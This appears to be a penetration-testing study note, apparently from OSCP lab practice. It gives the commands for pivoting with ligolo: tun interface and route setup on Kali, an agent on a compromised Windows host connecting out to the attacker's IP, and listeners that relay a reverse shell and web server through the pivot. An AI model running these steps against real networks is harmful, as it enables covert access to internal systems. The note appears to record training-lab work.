#pivoting 

```bash
sudo ip tuntap add user kali mode tun ligolo
```

```bash
sudo ip link set ligolo up
```

### Proxy(Listener - Kali)

```bash
~/oscp/linux_tools/lig_lin_proxy -selfcert
```
After session joins

```bash
session
```

```bash
start
```

```bash
sudo ip route add 172.16.8.0/24 dev ligolo
```
##### Change the default port 

```bash
~/oscp/lig_lin_proxy -selfcert -laddr 0.0.0.0:8080
```




### Agent(From the victim)

```powershell
.\agent.exe -connect 192.168.45.221:11601 -ignore-cert
```



### Catching a Reverse shell

- Pivot host is **10.10.136.147**
- Compromised host is **10.10.136.148**
- Kali is **192.168.45.209**
- Conpty port **8080**
- Webserver port **80**

```ligolo
listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8080 --tcp 
```

```ligolo
listener_add --addr 0.0.0.0:9002 --to 127.0.0.1:80 --tcp
```



